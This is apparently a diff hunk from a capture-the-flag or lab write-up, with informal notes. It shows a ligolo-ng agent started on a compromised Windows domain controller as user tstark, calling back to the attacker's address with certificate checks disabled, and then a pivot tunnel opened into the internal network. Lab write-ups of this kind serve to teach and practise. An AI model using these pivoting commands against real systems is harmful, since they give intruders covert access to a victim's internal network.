@@ -683,3 +683,21 @@ INFO[0039] Route created.
 ```
 Next ill configure the proxy on my system!
 
+```python
+PS C:\Users\tstark\Documents> ./agent.exe -connect 10.10.14.90:11601 --ignore-cert
+./agent.exe -connect 10.10.14.90:11601 --ignore-cert
+time="2026-05-12T20:31:27-07:00" level=warning msg="warning, certificate validation disabled"
+time="2026-05-12T20:31:27-07:00" level=info msg="Connection established" addr="10.10.14.90:11601"
+```
+Next ill execute the agent on the 
+
+```python
+ligolo-ng » INFO[0095] Agent joined.                                 id=a2deadce621d name="OFFICE\\tstark@DC" remote="10.129.32.165:55794"
+ligolo-ng » sessions
+error: unknown command, try 'help'
+ligolo-ng » session
+? Specify a session : 1 - OFFICE\tstark@DC - 10.129.32.165:55794 - a2deadce621d
+[Agent : OFFICE\tstark@DC] » tunnel_start --tun office
+INFO[0132] Starting tunnel to OFFICE\tstark@DC (a2deadce621d) 
+[Agent : OFFICE\tstark@DC] » 
+```
